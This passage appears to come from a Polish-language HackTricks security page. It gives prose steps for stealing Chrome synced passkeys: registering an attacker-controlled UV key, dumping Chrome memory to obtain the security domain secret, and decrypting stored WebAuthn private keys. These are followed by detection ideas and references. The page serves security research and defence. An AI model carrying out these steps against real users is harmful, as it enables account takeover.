- Jeśli onboardowanie pozostawi urządzenie w stanie **`uv_key_pending`**, zarejestruj kontrolowany przez atakującego klucz publiczny UV.
- Jeśli provider nie weryfikuje attestation / pochodzenia nowego klucza UV z secure hardware, późniejsze signatures z klucza atakującego będą traktowane jako **`UV=1`**.
3. **Kradzież master-secret / odzyskiwania SDS**<sup>[[4]](#references)</sup>
- Wymuś recovery lub ponowne dołączenie, aby Chrome pobrał zsynchronizowany master secret passkey.
- Obserwuj ponowne utworzenie/modyfikację `passkey_enclave_state`, a następnie wykonaj dump pamięci Chrome, gdy jawny **security domain secret (SDS)** znajduje się w pamięci.
- Użyj odzyskanego SDS do odszyfrowania zaszyfrowanych pól w każdym rekordzie `WebauthnCredentialSpecifics` i odzyskania przenośnych kluczy prywatnych WebAuthn.

### Pomysły dotyczące DFIR / wykrywania

- Monitoruj **usuwanie/ponowne tworzenie** `passkey_enclave_state`.<sup>[[4]](#references)</sup>
- Generuj alerty dotyczące nietypowego dostępu do **`Sync Data\LevelDB`** Chrome przez procesy inne niż przeglądarka.
- Generuj alerty dotyczące **zrzutów pamięci Chrome** lub podejrzanego dostępu do pamięci między procesami.
- Badaj powtarzające się monity o **Google Password Manager recovery PIN** lub nieoczekiwane ponowne onboardowanie.
- Pamiętaj, że WebAuthn **`signCount`** często nie jest przydatny w przypadku zsynchronizowanych passkeys, ponieważ może pozostać stały, więc klasyczne wykrywanie klonów jest mało skuteczne.

## References

- [1] [Unit 42 – Śledztwo w sprawie wieloletnich niewykrytych operacji wymierzonych w sektory o wysokiej wartości](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: phishing z makrem Word VBA przez SMTP → odszyfrowywanie poświadczeń hMailServer → Veeam CVE-2023-27532 do SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Wewnątrz Ink Dragon: ujawnienie sieci relay i wewnętrznego działania skrytej operacji ofensywnej](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: nowa powierzchnia ataku w uwierzytelnianiu bez haseł](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / przechowywanie kluczy CNG](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Hacking Windows: Ataki na systemy i sieci Microsoft](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Jak naprawdę działa magazyn danych Active Directory: wewnątrz NTDS.dit (część 1)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com – zdalny dump haseł LSASS](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Armored Likho rozszerza swój arsenał cyber-szpiegowski za pomocą toolkitu Still](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – funkcja CreateFileW i `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – tryb backupu Robocopy `/B`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [Telegram FAQ – kończenie aktywnych sesji](https://telegram.org/faq)
{{#include ../../banners/hacktricks-training.md}}
